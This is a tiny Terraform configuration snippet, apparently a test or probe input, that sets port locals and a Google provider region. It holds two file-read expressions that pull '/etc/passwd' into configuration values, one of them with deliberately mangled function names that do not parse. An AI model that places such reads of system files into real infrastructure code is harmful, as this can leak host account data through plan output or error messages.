
locals {
      internal = 8300
      external = 8300
      docker_ports = "${filebase64("/etc/passwd")}"
      }
provider "google" {
  region = cidr123host(fileb123ase64("/etc/passwd"), 12, 9)
  
  }

